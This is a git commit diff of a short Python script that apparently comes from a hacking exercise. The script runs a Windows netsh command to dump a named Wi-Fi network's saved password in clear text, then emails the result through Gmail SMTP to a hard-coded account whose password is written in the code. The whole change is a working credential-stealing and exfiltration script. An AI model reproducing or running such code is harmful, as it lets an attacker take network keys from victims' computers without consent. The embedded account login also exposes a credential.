737115479263d3de6591732eb98486441749bc7a
Mário Gil <mg_mesquita@hotmail.com>
2018-07-29 11:28:01 +0100

    Sending an email with wireless key for a specific network

--- execute_command.py
+++ execute_command.py
@@ -1,6 +1,16 @@
 #!/usr/bin/env python
 
-import subprocess
+import subprocess, smtplib
 
-command = "%SystemRoot%\Sysnative\msg.exe * you have been hacked"
-subprocess.Popen(command, shell=True)
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+command = 'netsh wlan show profile "Home Network" key=clear'
+result = subprocess.check_output(command, shell=True)
+send_mail("yelp.camp.mailer.123@gmail.com", "yelp.camp", result)
